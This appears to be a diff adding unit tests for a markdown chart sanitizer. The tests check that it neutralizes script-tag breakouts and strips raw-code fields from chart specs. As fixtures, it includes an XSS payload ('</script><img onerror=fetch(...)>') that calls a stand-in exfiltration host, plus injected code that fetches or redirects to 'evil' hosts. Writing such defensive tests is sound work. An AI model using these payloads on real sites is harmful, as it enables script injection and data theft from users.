@@ -11,6 +11,39 @@ describe('sanitizeMvizMarkdown', () => {
     expect(sanitizeMvizMarkdown('```bar size=[16,8]\n{"data":[]}\n```')).toContain('```bar size=[16,8]');
   });
 
+  it('neutralizes </script> breakout in chart string values', () => {
+    const evil =
+      'Team X</script><img src=x onerror="fetch(`http://sentinel.invalid/exfil`)">';
+    const sanitized = sanitizeMvizMarkdown(
+      '```bar\n' + JSON.stringify({ title: 'T', data: [{ x: evil, y: 1 }] }) + '\n```'
+    );
+    // The literal closing-tag sequence must not survive into the spec JSON —
+    // the slash is backslash-escaped so the HTML tokenizer can't match it.
+    expect(sanitized).not.toContain('</script');
+    expect(sanitized).toContain('Team X'); // label data itself preserved
+    // Rendering through mviz must not produce an executable breakout either.
+    const html = processMvizMarkdown(
+      '```bar\n' + JSON.stringify({ title: 'T', data: [{ x: evil, y: 1 }] }) + '\n```'
+    );
+    expect(html).not.toMatch(/<\/script><img/i);
+  });
+
+  it('drops mviz raw-code escape hatches from chart specs', () => {
+    const sanitized = sanitizeMvizMarkdown(
+      '```bar\n' +
+        JSON.stringify({
+          title: 'T',
+          data: [{ x: 'a', y: 1, _js_: '(()=>{fetch("http://sentinel.invalid")})()' }],
+          formatter: { _fn_: 'window.location="http://evil"' },
+        }) +
+        '\n```'
+    );
+    expect(sanitized).not.toContain('_js_');
+    expect(sanitized).not.toContain('_fn_');
+    expect(sanitized).not.toContain('sentinel.invalid');
+    expect(sanitized).not.toContain('evil');
+  });
+
   it('defaults plain numeric table columns to auto formatting', () => {
     const sanitized = sanitizeMvizMarkdown(
       '```table\n' +
